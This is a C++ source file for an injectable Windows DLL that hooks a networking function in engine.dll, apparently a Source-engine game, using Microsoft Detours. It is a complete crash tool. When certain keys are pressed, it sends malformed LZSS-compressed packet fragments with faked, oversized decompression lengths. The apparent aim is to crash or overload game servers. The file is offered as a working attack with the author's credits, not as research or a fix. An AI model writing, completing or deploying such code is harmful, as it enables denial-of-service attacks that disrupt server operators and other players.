#include "strojarbitbuffer.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <detours/detours.h>
#include <vector>

#define LZSS_ID (('S'<<24)|('S'<<16)|('Z'<<8)|('L'))
#define MAX_FILE_SIZE_BITS 26

char copy[256];

#define CREDITS_HEADER() \
	const char* credits = "This DLL was made by Architekt, https://steamcommunity.com/id/krysakarchi/ or Architekt#9810"; \
	memcpy(copy, credits, strlen(credits) + 1);

struct lzss_header_t
{
	uint32 id;
	uint32 actualSize;
};

typedef bool(__thiscall* FnSendSubChannelData)(void*, StrojarBitbuffer&);
FnSendSubChannelData OrigSendSubChannelData;

uint8* PatternScan(const char* moduleName, const char* signature)
{
	CREDITS_HEADER()
	void* module = GetModuleHandle(moduleName);

	static auto pattern_to_byte = [](const char* pattern) {
		auto bytes = std::vector<int>{};
		auto start = const_cast<char*>(pattern);
		auto end = const_cast<char*>(pattern) + strlen(pattern);

		for (auto current = start; current < end; ++current) {
			if (*current == '?') {
				++current;
				if (*current == '?')
					++current;
				bytes.push_back(-1);
			}
			else {
				bytes.push_back(strtoul(current, &current, 16));
			}
		}
		return bytes;
	};

	auto dosHeader = (PIMAGE_DOS_HEADER)module;
	auto ntHeaders = (PIMAGE_NT_HEADERS)((std::uint8_t*)module + dosHeader->e_lfanew);

	auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
	auto patternBytes = pattern_to_byte(signature);
	auto scanBytes = reinterpret_cast<std::uint8_t*>(module);

	auto s = patternBytes.size();
	auto d = patternBytes.data();

	for (auto i = 0ul; i < sizeOfImage - s; ++i) {
		bool found = true;
		for (auto j = 0ul; j < s; ++j) {
			if (scanBytes[i + j] != d[j] && d[j] != -1) {
				found = false;
				break;
			}
		}
		if (found) {
			return &scanBytes[i];
		}
	}
	return nullptr;
}

static inline void CreateMalformedCompressedFragment(uint32 size, StrojarBitbuffer& buf)
{
	CREDITS_HEADER()
	const uint32 realsize = 128;
	char buffer[realsize];

	memset(buffer, 0, realsize);

	lzss_header_t* header = (lzss_header_t*)buffer; // treat the beginning as a lzss header
	header->id = LZSS_ID; // set the compressor to LZSS
	header->actualSize = size * 2; // fake the uncompressed size

	buf.WriteUBitLong(0, 3); // first write subchannel index
	buf.WriteOneBit(1); // data follows
	buf.WriteOneBit(0); // single block bit

	buf.WriteOneBit(1); // data compressed
	buf.WriteUBitLong(size, MAX_FILE_SIZE_BITS); // size
	buf.WriteVarInt32(size); // buffer size

	buf.WriteBytes(buffer, realsize); // write the buffer
}

bool __fastcall HookSendSubChannelData(void* chan, int edx, StrojarBitbuffer& buf)
{
	CREDITS_HEADER()
	bool fuck = OrigSendSubChannelData(chan, buf);

	if (fuck)
	{
		return fuck;
	}
	else
	{
		if (GetAsyncKeyState(VK_PRIOR) & 0x8000)
		{
			CreateMalformedCompressedFragment(2097152, buf);
			return true;
		}
		else if (GetAsyncKeyState(VK_NEXT) & 0x8000)
		{
			CreateMalformedCompressedFragment(8388608, buf);
			return true;
		}
		else if(GetAsyncKeyState(VK_END) & 0x8000)
		{
			CreateMalformedCompressedFragment(67108863, buf);
			return true;
		}

		return fuck;
	}
}

DWORD WINAPI OnInject(LPVOID)
{
	CREDITS_HEADER()
	OrigSendSubChannelData = (FnSendSubChannelData)PatternScan("engine.dll", "55 8B EC 83 EC 6C 53 8B D9 8B 0D ? ? ? ? 56 57 89 5D F8 8B 81 ? ? ? ? 89 45 CC ");

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)OrigSendSubChannelData, HookSendSubChannelData);
	DetourTransactionCommit();

	return 0;
}

DWORD WINAPI OnUnload(LPVOID)
{
	CREDITS_HEADER()
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)OrigSendSubChannelData, HookSendSubChannelData);
	DetourTransactionCommit();

	return 0;
}

int WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	CREDITS_HEADER()
	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
			CreateThread(0, 0, OnInject, 0, 0, 0);
		break;
		case DLL_PROCESS_DETACH:
			CreateThread(0, 0, OnUnload, 0, 0, 0);
		break;
	}

	return 1;
}